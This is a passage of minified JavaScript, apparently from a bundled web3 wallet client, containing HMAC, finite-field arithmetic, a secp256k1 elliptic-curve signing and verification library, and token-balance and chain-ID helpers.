`)),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiParameters.LengthMismatchError"})}}class pV extends Or{constructor(e){super(`Type \`${e}\` is not a valid ABI Type.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiParameters.InvalidTypeError"})}}class s9 extends r2{constructor(e,r){super(),this.finished=!1,this.destroyed=!1,qj(e);const n=i1(r);if(this.iHash=e.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const i=this.blockLen,s=new Uint8Array(i);s.set(n.length>i?e.create().update(n).digest():n);for(let o=0;o<s.length;o++)s[o]^=54;this.iHash.update(s),this.oHash=e.create();for(let o=0;o<s.length;o++)s[o]^=106;this.oHash.update(s),s.fill(0)}update(e){return Hu(this),this.iHash.update(e),this}digestInto(e){Hu(this),Yf(e,this.outputLen),this.finished=!0,this.iHash.digestInto(e),this.oHash.update(e),this.oHash.digestInto(e),this.destroy()}digest(){const e=new Uint8Array(this.oHash.outputLen);return this.digestInto(e),e}_cloneInto(e){e||(e=Object.create(Object.getPrototypeOf(this),{}));const{oHash:r,iHash:n,finished:i,destroyed:s,blockLen:o,outputLen:a}=this;return e=e,e.finished=i,e.destroyed=s,e.blockLen=o,e.outputLen=a,e.oHash=r._cloneInto(e.oHash),e.iHash=n._cloneInto(e.iHash),e}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}}const o9=(t,e,r)=>new s9(t,e).update(r).digest();o9.create=(t,e)=>new s9(t,e);const Qt=BigInt(0),St=BigInt(1),Sa=BigInt(2),gV=BigInt(3),Ry=BigInt(4),I4=BigInt(5),S4=BigInt(8);function qr(t,e){const r=t%e;return r>=Qt?r:e+r}function wV(t,e,r){if(e<Qt)throw new Error("invalid exponent, negatives unsupported");if(r<=Qt)throw new Error("invalid modulus");if(r===St)return Qt;let n=St;for(;e>Qt;)e&St&&(n=n*t%r),t=t*t%r,e>>=St;return n}function An(t,e,r){let n=t;for(;e-- >Qt;)n*=n,n%=r;return n}function Dy(t,e){if(t===Qt)throw new Error("invert: expected non-zero number");if(e<=Qt)throw new Error("invert: expected positive modulus, got "+e);let r=qr(t,e),n=e,i=Qt,s=St;for(;r!==Qt;){const o=n/r,a=n%r,c=i-s*o;n=r,r=a,i=s,s=c}if(n!==St)throw new Error("invert: does not exist");return qr(i,e)}function mV(t){const e=(t-St)/Sa;let r,n,i;for(r=t-St,n=0;r%Sa===Qt;r/=Sa,n++);for(i=Sa;i<t&&wV(i,e,t)!==t-St;i++)if(i>1e3)throw new Error("Cannot find square root: likely non-prime P");if(n===1){const o=(t+St)/Ry;return function(a,c){const l=a.pow(c,o);if(!a.eql(a.sqr(l),c))throw new Error("Cannot find square root");return l}}const s=(r+St)/Sa;return function(o,a){if(o.pow(a,e)===o.neg(o.ONE))throw new Error("Cannot find square root");let c=n,l=o.pow(o.mul(o.ONE,i),r),u=o.pow(a,s),h=o.pow(a,r);for(;!o.eql(h,o.ONE);){if(o.eql(h,o.ZERO))return o.ZERO;let d=1;for(let g=o.sqr(h);d<c&&!o.eql(g,o.ONE);d++)g=o.sqr(g);const f=o.pow(l,St<<BigInt(c-d-1));l=o.sqr(f),u=o.mul(u,f),h=o.mul(h,l),c=d}return u}}function yV(t){if(t%Ry===gV){const e=(t+St)/Ry;return function(r,n){const i=r.pow(n,e);if(!r.eql(r.sqr(i),n))throw new Error("Cannot find square root");return i}}if(t%S4===I4){const e=(t-I4)/S4;return function(r,n){const i=r.mul(n,Sa),s=r.pow(i,e),o=r.mul(n,s),a=r.mul(r.mul(o,Sa),s),c=r.mul(o,r.sub(a,r.ONE));if(!r.eql(r.sqr(c),n))throw new Error("Cannot find square root");return c}}return mV(t)}const bV=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function vV(t){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},r=bV.reduce((n,i)=>(n[i]="function",n),e);return rp(t,r)}function EV(t,e,r){if(r<Qt)throw new Error("invalid exponent, negatives unsupported");if(r===Qt)return t.ONE;if(r===St)return e;let n=t.ONE,i=e;for(;r>Qt;)r&St&&(n=t.mul(n,i)),i=t.sqr(i),r>>=St;return n}function CV(t,e){const r=new Array(e.length),n=e.reduce((s,o,a)=>t.is0(o)?s:(r[a]=s,t.mul(s,o)),t.ONE),i=t.inv(n);return e.reduceRight((s,o,a)=>t.is0(o)?s:(r[a]=t.mul(s,r[a]),t.mul(s,o)),i),r}function a9(t,e){const r=e!==void 0?e:t.toString(2).length,n=Math.ceil(r/8);return{nBitLength:r,nByteLength:n}}function c9(t,e,r=!1,n={}){if(t<=Qt)throw new Error("invalid field: expected ORDER > 0, got "+t);const{nBitLength:i,nByteLength:s}=a9(t,e);if(s>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let o;const a=Object.freeze({ORDER:t,isLE:r,BITS:i,BYTES:s,MASK:f2(i),ZERO:Qt,ONE:St,create:c=>qr(c,t),isValid:c=>{if(typeof c!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof c);return Qt<=c&&c<t},is0:c=>c===Qt,isOdd:c=>(c&St)===St,neg:c=>qr(-c,t),eql:(c,l)=>c===l,sqr:c=>qr(c*c,t),add:(c,l)=>qr(c+l,t),sub:(c,l)=>qr(c-l,t),mul:(c,l)=>qr(c*l,t),pow:(c,l)=>EV(a,c,l),div:(c,l)=>qr(c*Dy(l,t),t),sqrN:c=>c*c,addN:(c,l)=>c+l,subN:(c,l)=>c-l,mulN:(c,l)=>c*l,inv:c=>Dy(c,t),sqrt:n.sqrt||(c=>(o||(o=yV(t)),o(a,c))),invertBatch:c=>CV(a,c),cmov:(c,l,u)=>u?l:c,toBytes:c=>r?d2(c,s):Ju(c,s),fromBytes:c=>{if(c.length!==s)throw new Error("Field.fromBytes: expected "+s+" bytes, got "+c.length);return r?h2(c):uc(c)}});return Object.freeze(a)}function l9(t){if(typeof t!="bigint")throw new Error("field order must be bigint");const e=t.toString(2).length;return Math.ceil(e/8)}function u9(t){const e=l9(t);return e+Math.ceil(e/2)}function AV(t,e,r=!1){const n=t.length,i=l9(e),s=u9(e);if(n<16||n<s||n>1024)throw new Error("expected "+s+"-1024 bytes of input, got "+n);const o=r?h2(t):uc(t),a=qr(o,e-St)+St;return r?d2(a,i):Ju(a,i)}const N4=BigInt(0),Lp=BigInt(1);function $w(t,e){const r=e.negate();return t?r:e}function h9(t,e){if(!Number.isSafeInteger(t)||t<=0||t>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+t)}function Rw(t,e){h9(t,e);const r=Math.ceil(e/t)+1,n=2**(t-1);return{windows:r,windowSize:n}}function xV(t,e){if(!Array.isArray(t))throw new Error("array expected");t.forEach((r,n)=>{if(!(r instanceof e))throw new Error("invalid point at index "+n)})}function IV(t,e){if(!Array.isArray(t))throw new Error("array of scalars expected");t.forEach((r,n)=>{if(!e.isValid(r))throw new Error("invalid scalar at index "+n)})}const Dw=new WeakMap,d9=new WeakMap;function Bw(t){return d9.get(t)||1}function SV(t,e){return{constTimeNegate:$w,hasPrecomputes(r){return Bw(r)!==1},unsafeLadder(r,n,i=t.ZERO){let s=r;for(;n>N4;)n&Lp&&(i=i.add(s)),s=s.double(),n>>=Lp;return i},precomputeWindow(r,n){const{windows:i,windowSize:s}=Rw(n,e),o=[];let a=r,c=a;for(let l=0;l<i;l++){c=a,o.push(c);for(let u=1;u<s;u++)c=c.add(a),o.push(c);a=c.double()}return o},wNAF(r,n,i){const{windows:s,windowSize:o}=Rw(r,e);let a=t.ZERO,c=t.BASE;const l=BigInt(2**r-1),u=2**r,h=BigInt(r);for(let d=0;d<s;d++){const f=d*o;let g=Number(i&l);i>>=h,g>o&&(g-=u,i+=Lp);const p=f,w=f+Math.abs(g)-1,m=d%2!==0,b=g<0;g===0?c=c.add($w(m,n[p])):a=a.add($w(b,n[w]))}return{p:a,f:c}},wNAFUnsafe(r,n,i,s=t.ZERO){const{windows:o,windowSize:a}=Rw(r,e),c=BigInt(2**r-1),l=2**r,u=BigInt(r);for(let h=0;h<o;h++){const d=h*a;if(i===N4)break;let f=Number(i&c);if(i>>=u,f>a&&(f-=l,i+=Lp),f===0)continue;let g=n[d+Math.abs(f)-1];f<0&&(g=g.negate()),s=s.add(g)}return s},getPrecomputes(r,n,i){let s=Dw.get(n);return s||(s=this.precomputeWindow(n,r),r!==1&&Dw.set(n,i(s))),s},wNAFCached(r,n,i){const s=Bw(r);return this.wNAF(s,this.getPrecomputes(s,r,i),n)},wNAFCachedUnsafe(r,n,i,s){const o=Bw(r);return o===1?this.unsafeLadder(r,n,s):this.wNAFUnsafe(o,this.getPrecomputes(o,r,i),n,s)},setWindowSize(r,n){h9(n,e),d9.set(r,n),Dw.delete(r)}}}function NV(t,e,r,n){if(xV(r,t),IV(n,e),r.length!==n.length)throw new Error("arrays of points and scalars must have equal length");const i=t.ZERO,s=YA(BigInt(r.length)),o=s>12?s-3:s>4?s-2:s?2:1,a=(1<<o)-1,c=new Array(a+1).fill(i),l=Math.floor((e.BITS-1)/o)*o;let u=i;for(let h=l;h>=0;h-=o){c.fill(i);for(let f=0;f<n.length;f++){const g=n[f],p=Number(g>>BigInt(h)&BigInt(a));c[p]=c[p].add(r[f])}let d=i;for(let f=c.length-1,g=i;f>0;f--)g=g.add(c[f]),d=d.add(g);if(u=u.add(d),h!==0)for(let f=0;f<o;f++)u=u.double()}return u}function f9(t){return vV(t.Fp),rp(t,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...a9(t.n,t.nBitLength),...t,p:t.Fp.ORDER})}function P4(t){t.lowS!==void 0&&Gu("lowS",t.lowS),t.prehash!==void 0&&Gu("prehash",t.prehash)}function PV(t){const e=f9(t);rp(e,{a:"field",b:"field"},{allowedPrivateKeyLengths:"array",wrapPrivateKey:"boolean",isTorsionFree:"function",clearCofactor:"function",allowInfinityPoint:"boolean",fromBytes:"function",toBytes:"function"});const{endo:r,Fp:n,a:i}=e;if(r){if(!n.eql(i,n.ZERO))throw new Error("invalid endomorphism, can only be defined for Koblitz curves that have a=0");if(typeof r!="object"||typeof r.beta!="bigint"||typeof r.splitScalar!="function")throw new Error("invalid endomorphism, expected beta: bigint and splitScalar: function")}return Object.freeze({...e})}const{bytesToNumberBE:kV,hexToBytes:OV}=Dq;class _V extends Error{constructor(e=""){super(e)}}const ys={Err:_V,_tlv:{encode:(t,e)=>{const{Err:r}=ys;if(t<0||t>256)throw new r("tlv.encode: wrong tag");if(e.length&1)throw new r("tlv.encode: unpadded data");const n=e.length/2,i=Bl(n);if(i.length/2&128)throw new r("tlv.encode: long form length too big");const s=n>127?Bl(i.length/2|128):"";return Bl(t)+s+i+e},decode(t,e){const{Err:r}=ys;let n=0;if(t<0||t>256)throw new r("tlv.encode: wrong tag");if(e.length<2||e[n++]!==t)throw new r("tlv.decode: wrong tlv");const i=e[n++],s=!!(i&128);let o=0;if(!s)o=i;else{const c=i&127;if(!c)throw new r("tlv.decode(long): indefinite length not supported");if(c>4)throw new r("tlv.decode(long): byte length is too big");const l=e.subarray(n,n+c);if(l.length!==c)throw new r("tlv.decode: length bytes not complete");if(l[0]===0)throw new r("tlv.decode(long): zero leftmost byte");for(const u of l)o=o<<8|u;if(n+=c,o<128)throw new r("tlv.decode(long): not minimal encoding")}const a=e.subarray(n,n+o);if(a.length!==o)throw new r("tlv.decode: wrong value length");return{v:a,l:e.subarray(n+o)}}},_int:{encode(t){const{Err:e}=ys;if(t<$s)throw new e("integer: negative integers are not allowed");let r=Bl(t);if(Number.parseInt(r[0],16)&8&&(r="00"+r),r.length&1)throw new e("unexpected DER parsing assertion: unpadded hex");return r},decode(t){const{Err:e}=ys;if(t[0]&128)throw new e("invalid signature integer: negative");if(t[0]===0&&!(t[1]&128))throw new e("invalid signature integer: unnecessary leading zero");return kV(t)}},toSig(t){const{Err:e,_int:r,_tlv:n}=ys,i=typeof t=="string"?OV(t):t;tp(i);const{v:s,l:o}=n.decode(48,i);if(o.length)throw new e("invalid signature: left bytes after parsing");const{v:a,l:c}=n.decode(2,s),{v:l,l:u}=n.decode(2,c);if(u.length)throw new e("invalid signature: left bytes after parsing");return{r:r.decode(a),s:r.decode(l)}},hexFromSig(t){const{_tlv:e,_int:r}=ys,n=e.encode(2,r.encode(t.r)),i=e.encode(2,r.encode(t.s)),s=n+i;return e.encode(48,s)}},$s=BigInt(0),Vt=BigInt(1);BigInt(2);const k4=BigInt(3);BigInt(4);function TV(t){const e=PV(t),{Fp:r}=e,n=c9(e.n,e.nBitLength),i=e.toBytes||((p,w,m)=>{const b=w.toAffine();return cf(Uint8Array.from([4]),r.toBytes(b.x),r.toBytes(b.y))}),s=e.fromBytes||(p=>{const w=p.subarray(1),m=r.fromBytes(w.subarray(0,r.BYTES)),b=r.fromBytes(w.subarray(r.BYTES,2*r.BYTES));return{x:m,y:b}});function o(p){const{a:w,b:m}=e,b=r.sqr(p),v=r.mul(b,p);return r.add(r.add(v,r.mul(p,w)),m)}if(!r.eql(r.sqr(e.Gy),o(e.Gx)))throw new Error("bad generator point: equation left != right");function a(p){return h1(p,Vt,e.n)}function c(p){const{allowedPrivateKeyLengths:w,nByteLength:m,wrapPrivateKey:b,n:v}=e;if(w&&typeof p!="bigint"){if(Sc(p)&&(p=Ku(p)),typeof p!="string"||!w.includes(p.length))throw new Error("invalid private key");p=p.padStart(m*2,"0")}let x;try{x=typeof p=="bigint"?p:uc(ri("private key",p,m))}catch{throw new Error("invalid private key, expected hex or "+m+" bytes, got "+typeof p)}return b&&(x=qr(x,v)),hc("private key",x,Vt,v),x}function l(p){if(!(p instanceof d))throw new Error("ProjectivePoint expected")}const u=_y((p,w)=>{const{px:m,py:b,pz:v}=p;if(r.eql(v,r.ONE))return{x:m,y:b};const x=p.is0();w==null&&(w=x?r.ONE:r.inv(v));const I=r.mul(m,w),C=r.mul(b,w),N=r.mul(v,w);if(x)return{x:r.ZERO,y:r.ZERO};if(!r.eql(N,r.ONE))throw new Error("invZ was invalid");return{x:I,y:C}}),h=_y(p=>{if(p.is0()){if(e.allowInfinityPoint&&!r.is0(p.py))return;throw new Error("bad point: ZERO")}const{x:w,y:m}=p.toAffine();if(!r.isValid(w)||!r.isValid(m))throw new Error("bad point: x or y not FE");const b=r.sqr(m),v=o(w);if(!r.eql(b,v))throw new Error("bad point: equation left != right");if(!p.isTorsionFree())throw new Error("bad point: not in prime-order subgroup");return!0});class d{constructor(w,m,b){if(this.px=w,this.py=m,this.pz=b,w==null||!r.isValid(w))throw new Error("x required");if(m==null||!r.isValid(m))throw new Error("y required");if(b==null||!r.isValid(b))throw new Error("z required");Object.freeze(this)}static fromAffine(w){const{x:m,y:b}=w||{};if(!w||!r.isValid(m)||!r.isValid(b))throw new Error("invalid affine point");if(w instanceof d)throw new Error("projective point not allowed");const v=x=>r.eql(x,r.ZERO);return v(m)&&v(b)?d.ZERO:new d(m,b,r.ONE)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static normalizeZ(w){const m=r.invertBatch(w.map(b=>b.pz));return w.map((b,v)=>b.toAffine(m[v])).map(d.fromAffine)}static fromHex(w){const m=d.fromAffine(s(ri("pointHex",w)));return m.assertValidity(),m}static fromPrivateKey(w){return d.BASE.multiply(c(w))}static msm(w,m){return NV(d,n,w,m)}_setWindowSize(w){g.setWindowSize(this,w)}assertValidity(){h(this)}hasEvenY(){const{y:w}=this.toAffine();if(r.isOdd)return!r.isOdd(w);throw new Error("Field doesn't support isOdd")}equals(w){l(w);const{px:m,py:b,pz:v}=this,{px:x,py:I,pz:C}=w,N=r.eql(r.mul(m,C),r.mul(x,v)),S=r.eql(r.mul(b,C),r.mul(I,v));return N&&S}negate(){return new d(this.px,r.neg(this.py),this.pz)}double(){const{a:w,b:m}=e,b=r.mul(m,k4),{px:v,py:x,pz:I}=this;let C=r.ZERO,N=r.ZERO,S=r.ZERO,P=r.mul(v,v),T=r.mul(x,x),D=r.mul(I,I),z=r.mul(v,x);return z=r.add(z,z),S=r.mul(v,I),S=r.add(S,S),C=r.mul(w,S),N=r.mul(b,D),N=r.add(C,N),C=r.sub(T,N),N=r.add(T,N),N=r.mul(C,N),C=r.mul(z,C),S=r.mul(b,S),D=r.mul(w,D),z=r.sub(P,D),z=r.mul(w,z),z=r.add(z,S),S=r.add(P,P),P=r.add(S,P),P=r.add(P,D),P=r.mul(P,z),N=r.add(N,P),D=r.mul(x,I),D=r.add(D,D),P=r.mul(D,z),C=r.sub(C,P),S=r.mul(D,T),S=r.add(S,S),S=r.add(S,S),new d(C,N,S)}add(w){l(w);const{px:m,py:b,pz:v}=this,{px:x,py:I,pz:C}=w;let N=r.ZERO,S=r.ZERO,P=r.ZERO;const T=e.a,D=r.mul(e.b,k4);let z=r.mul(m,x),V=r.mul(b,I),O=r.mul(v,C),y=r.add(m,b),E=r.add(x,I);y=r.mul(y,E),E=r.add(z,V),y=r.sub(y,E),E=r.add(m,v);let k=r.add(x,C);return E=r.mul(E,k),k=r.add(z,O),E=r.sub(E,k),k=r.add(b,v),N=r.add(I,C),k=r.mul(k,N),N=r.add(V,O),k=r.sub(k,N),P=r.mul(T,E),N=r.mul(D,O),P=r.add(N,P),N=r.sub(V,P),P=r.add(V,P),S=r.mul(N,P),V=r.add(z,z),V=r.add(V,z),O=r.mul(T,O),E=r.mul(D,E),V=r.add(V,O),O=r.sub(z,O),O=r.mul(T,O),E=r.add(E,O),z=r.mul(V,E),S=r.add(S,z),z=r.mul(k,E),N=r.mul(y,N),N=r.sub(N,z),z=r.mul(y,V),P=r.mul(k,P),P=r.add(P,z),new d(N,S,P)}subtract(w){return this.add(w.negate())}is0(){return this.equals(d.ZERO)}wNAF(w){return g.wNAFCached(this,w,d.normalizeZ)}multiplyUnsafe(w){const{endo:m,n:b}=e;hc("scalar",w,$s,b);const v=d.ZERO;if(w===$s)return v;if(this.is0()||w===Vt)return this;if(!m||g.hasPrecomputes(this))return g.wNAFCachedUnsafe(this,w,d.normalizeZ);let{k1neg:x,k1:I,k2neg:C,k2:N}=m.splitScalar(w),S=v,P=v,T=this;for(;I>$s||N>$s;)I&Vt&&(S=S.add(T)),N&Vt&&(P=P.add(T)),T=T.double(),I>>=Vt,N>>=Vt;return x&&(S=S.negate()),C&&(P=P.negate()),P=new d(r.mul(P.px,m.beta),P.py,P.pz),S.add(P)}multiply(w){const{endo:m,n:b}=e;hc("scalar",w,Vt,b);let v,x;if(m){const{k1neg:I,k1:C,k2neg:N,k2:S}=m.splitScalar(w);let{p:P,f:T}=this.wNAF(C),{p:D,f:z}=this.wNAF(S);P=g.constTimeNegate(I,P),D=g.constTimeNegate(N,D),D=new d(r.mul(D.px,m.beta),D.py,D.pz),v=P.add(D),x=T.add(z)}else{const{p:I,f:C}=this.wNAF(w);v=I,x=C}return d.normalizeZ([v,x])[0]}multiplyAndAddUnsafe(w,m,b){const v=d.BASE,x=(C,N)=>N===$s||N===Vt||!C.equals(v)?C.multiplyUnsafe(N):C.multiply(N),I=x(this,m).add(x(w,b));return I.is0()?void 0:I}toAffine(w){return u(this,w)}isTorsionFree(){const{h:w,isTorsionFree:m}=e;if(w===Vt)return!0;if(m)return m(d,this);throw new Error("isTorsionFree() has not been declared for the elliptic curve")}clearCofactor(){const{h:w,clearCofactor:m}=e;return w===Vt?this:m?m(d,this):this.multiplyUnsafe(e.h)}toRawBytes(w=!0){return Gu("isCompressed",w),this.assertValidity(),i(d,this,w)}toHex(w=!0){return Gu("isCompressed",w),Ku(this.toRawBytes(w))}}d.BASE=new d(e.Gx,e.Gy,r.ONE),d.ZERO=new d(r.ZERO,r.ONE,r.ZERO);const f=e.nBitLength,g=SV(d,e.endo?Math.ceil(f/2):f);return{CURVE:e,ProjectivePoint:d,normPrivateKeyToScalar:c,weierstrassEquation:o,isWithinCurveOrder:a}}function $V(t){const e=f9(t);return rp(e,{hash:"hash",hmac:"function",randomBytes:"function"},{bits2int:"function",bits2int_modN:"function",lowS:"boolean"}),Object.freeze({lowS:!0,...e})}function RV(t){const e=$V(t),{Fp:r,n}=e,i=r.BYTES+1,s=2*r.BYTES+1;function o(O){return qr(O,n)}function a(O){return Dy(O,n)}const{ProjectivePoint:c,normPrivateKeyToScalar:l,weierstrassEquation:u,isWithinCurveOrder:h}=TV({...e,toBytes(O,y,E){const k=y.toAffine(),_=r.toBytes(k.x),R=cf;return Gu("isCompressed",E),E?R(Uint8Array.from([y.hasEvenY()?2:3]),_):R(Uint8Array.from([4]),_,r.toBytes(k.y))},fromBytes(O){const y=O.length,E=O[0],k=O.subarray(1);if(y===i&&(E===2||E===3)){const _=uc(k);if(!h1(_,Vt,r.ORDER))throw new Error("Point is not on curve");const R=u(_);let L;try{L=r.sqrt(R)}catch(W){const Z=W instanceof Error?": "+W.message:"";throw new Error("Point is not on curve"+Z)}const q=(L&Vt)===Vt;return(E&1)===1!==q&&(L=r.neg(L)),{x:_,y:L}}else if(y===s&&E===4){const _=r.fromBytes(k.subarray(0,r.BYTES)),R=r.fromBytes(k.subarray(r.BYTES,2*r.BYTES));return{x:_,y:R}}else{const _=i,R=s;throw new Error("invalid Point, expected length of "+_+", or uncompressed "+R+", got "+y)}}}),d=O=>Ku(Ju(O,e.nByteLength));function f(O){const y=n>>Vt;return O>y}function g(O){return f(O)?o(-O):O}const p=(O,y,E)=>uc(O.slice(y,E));class w{constructor(y,E,k){this.r=y,this.s=E,this.recovery=k,this.assertValidity()}static fromCompact(y){const E=e.nByteLength;return y=ri("compactSignature",y,E*2),new w(p(y,0,E),p(y,E,2*E))}static fromDER(y){const{r:E,s:k}=ys.toSig(ri("DER",y));return new w(E,k)}assertValidity(){hc("r",this.r,Vt,n),hc("s",this.s,Vt,n)}addRecoveryBit(y){return new w(this.r,this.s,y)}recoverPublicKey(y){const{r:E,s:k,recovery:_}=this,R=C(ri("msgHash",y));if(_==null||![0,1,2,3].includes(_))throw new Error("recovery id invalid");const L=_===2||_===3?E+e.n:E;if(L>=r.ORDER)throw new Error("recovery id 2 or 3 invalid");const q=(_&1)===0?"02":"03",W=c.fromHex(q+d(L)),Z=a(L),G=o(-R*Z),ne=o(k*Z),de=c.BASE.multiplyAndAddUnsafe(W,G,ne);if(!de)throw new Error("point at infinify");return de.assertValidity(),de}hasHighS(){return f(this.s)}normalizeS(){return this.hasHighS()?new w(this.r,o(-this.s),this.recovery):this}toDERRawBytes(){return Zu(this.toDERHex())}toDERHex(){return ys.hexFromSig({r:this.r,s:this.s})}toCompactRawBytes(){return Zu(this.toCompactHex())}toCompactHex(){return d(this.r)+d(this.s)}}const m={isValidPrivateKey(O){try{return l(O),!0}catch{return!1}},normPrivateKeyToScalar:l,randomPrivateKey:()=>{const O=u9(e.n);return AV(e.randomBytes(O),e.n)},precompute(O=8,y=c.BASE){return y._setWindowSize(O),y.multiply(BigInt(3)),y}};function b(O,y=!0){return c.fromPrivateKey(O).toRawBytes(y)}function v(O){const y=Sc(O),E=typeof O=="string",k=(y||E)&&O.length;return y?k===i||k===s:E?k===2*i||k===2*s:O instanceof c}function x(O,y,E=!0){if(v(O))throw new Error("first arg must be private key");if(!v(y))throw new Error("second arg must be public key");return c.fromHex(y).multiply(l(O)).toRawBytes(E)}const I=e.bits2int||function(O){if(O.length>8192)throw new Error("input is too large");const y=uc(O),E=O.length*8-e.nBitLength;return E>0?y>>BigInt(E):y},C=e.bits2int_modN||function(O){return o(I(O))},N=f2(e.nBitLength);function S(O){return hc("num < 2^"+e.nBitLength,O,$s,N),Ju(O,e.nByteLength)}function P(O,y,E=T){if(["recovered","canonical"].some(Ne=>Ne in E))throw new Error("sign() legacy options not supported");const{hash:k,randomBytes:_}=e;let{lowS:R,prehash:L,extraEntropy:q}=E;R==null&&(R=!0),O=ri("msgHash",O),P4(E),L&&(O=ri("prehashed msgHash",k(O)));const W=C(O),Z=l(y),G=[S(Z),S(W)];if(q!=null&&q!==!1){const Ne=q===!0?_(r.BYTES):q;G.push(ri("extraEntropy",Ne))}const ne=cf(...G),de=W;function Se(Ne){const be=I(Ne);if(!h(be))return;const ke=a(be),Me=c.BASE.multiply(be).toAffine(),Ue=o(Me.x);if(Ue===$s)return;const Le=o(ke*o(de+Ue*Z));if(Le===$s)return;let wt=(Me.x===Ue?0:2)|Number(Me.y&Vt),bn=Le;return R&&f(Le)&&(bn=g(Le),wt^=1),new w(Ue,bn,wt)}return{seed:ne,k2sig:Se}}const T={lowS:e.lowS,prehash:!1},D={lowS:e.lowS,prehash:!1};function z(O,y,E=T){const{seed:k,k2sig:_}=P(O,y,E),R=e;return XA(R.hash.outputLen,R.nByteLength,R.hmac)(k,_)}c.BASE._setWindowSize(8);function V(O,y,E,k=D){var Le;const _=O;y=ri("msgHash",y),E=ri("publicKey",E);const{lowS:R,prehash:L,format:q}=k;if(P4(k),"strict"in k)throw new Error("options.strict was renamed to lowS");if(q!==void 0&&q!=="compact"&&q!=="der")throw new Error("format must be compact or der");const W=typeof _=="string"||Sc(_),Z=!W&&!q&&typeof _=="object"&&_!==null&&typeof _.r=="bigint"&&typeof _.s=="bigint";if(!W&&!Z)throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");let G,ne;try{if(Z&&(G=new w(_.r,_.s)),W){try{q!=="compact"&&(G=w.fromDER(_))}catch(wt){if(!(wt instanceof ys.Err))throw wt}!G&&q!=="der"&&(G=w.fromCompact(_))}ne=c.fromHex(E)}catch{return!1}if(!G||R&&G.hasHighS())return!1;L&&(y=e.hash(y));const{r:de,s:Se}=G,Ne=C(y),be=a(Se),ke=o(Ne*be),Me=o(de*be),Ue=(Le=c.BASE.multiplyAndAddUnsafe(ne,ke,Me))==null?void 0:Le.toAffine();return Ue?o(Ue.x)===de:!1}return{CURVE:e,getPublicKey:b,getSharedSecret:x,sign:z,verify:V,ProjectivePoint:c,Signature:w,utils:m}}function DV(t){return{hash:t,hmac:(e,...r)=>o9(t,e,eH(...r)),randomBytes:tH}}function BV(t,e){const r=n=>RV({...t,...DV(n)});return{...r(e),create:r}}const p9=BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"),O4=BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"),LV=BigInt(1),By=BigInt(2),_4=(t,e)=>(t+e/By)/e;function UV(t){const e=p9,r=BigInt(3),n=BigInt(6),i=BigInt(11),s=BigInt(22),o=BigInt(23),a=BigInt(44),c=BigInt(88),l=t*t*t%e,u=l*l*t%e,h=An(u,r,e)*u%e,d=An(h,r,e)*u%e,f=An(d,By,e)*l%e,g=An(f,i,e)*f%e,p=An(g,s,e)*g%e,w=An(p,a,e)*p%e,m=An(w,c,e)*w%e,b=An(m,a,e)*p%e,v=An(b,r,e)*u%e,x=An(v,o,e)*g%e,I=An(x,n,e)*l%e,C=An(I,By,e);if(!Ly.eql(Ly.sqr(C),t))throw new Error("Cannot find square root");return C}const Ly=c9(p9,void 0,void 0,{sqrt:UV});BV({a:BigInt(0),b:BigInt(7),Fp:Ly,n:O4,Gx:BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),Gy:BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),h:BigInt(1),lowS:!0,endo:{beta:BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),splitScalar:t=>{const e=O4,r=BigInt("0x3086d221a7d46bcde86c90e49284eb15"),n=-LV*BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),i=BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),s=r,o=BigInt("0x100000000000000000000000000000000"),a=_4(s*t,e),c=_4(-n*t,e);let l=qr(t-a*r-c*i,e),u=qr(-a*n-c*s,e);const h=l>o,d=u>o;if(h&&(l=e-l),d&&(u=e-u),l>o||u>o)throw new Error("splitScalar: Endomorphism failed, k="+t);return{k1neg:h,k1:l,k2neg:d,k2:u}}}},qA),BigInt(0);const Lw={createBalance(t,e){const r={name:t.metadata.name||"",symbol:t.metadata.symbol||"",decimals:t.metadata.decimals||0,value:t.metadata.value||0,price:t.metadata.price||0,iconUrl:t.metadata.iconUrl||""};return{name:r.name,symbol:r.symbol,chainId:e,address:t.address==="native"?void 0:this.convertAddressToCAIP10Address(t.address,e),value:r.value,price:r.price,quantity:{decimals:r.decimals.toString(),numeric:this.convertHexToBalance({hex:t.balance,decimals:r.decimals})},iconUrl:r.iconUrl}},convertHexToBalance({hex:t,decimals:e}){return BA(BigInt(t),e)},convertAddressToCAIP10Address(t,e){return`${e}:${t}`},createCAIP2ChainId(t,e){return`${e}:${parseInt(t,16)}`},getChainIdHexFromCAIP2ChainId(t){const e=t.split(":");if(e.length<2||!e[1])return"0x0";const r=e[1],n=parseInt(r,10);return isNaN(n)?"0x0":`0x${n.toString(16)}`},isWalletGetAssetsResponse(t){return typeof t!="object"||t===null?!1:Object.values(t).every(e=>Array.isArray(e)&&e.every(r=>this.isValidAsset(r)))},isValidAsset(t){return typeof t=="object"&&t!==null&&typeof t.address=="string"&&typeof t.balance=="string"&&(t.type==="ERC20"||t.type==="NATIVE")&&typeof t.metadata=="object"&&t.metadata!==null&&typeof t.metadata.name=="string"&&typeof t.metadata.symbol=="string"&&typeof t.metadata.decimals=="number"&&typeof t.metadata.price=="number"&&typeof t.metadata.iconUrl=="string"}},T4={async getMyTokensWithBalance(t){const e=me.state.address,r=B.state.activeCaipNetwork;if(!e||!r)return[];if(r.chainNamespace==="eip155"){const i=await this.getEIP155Balances(e,r);if(i)return 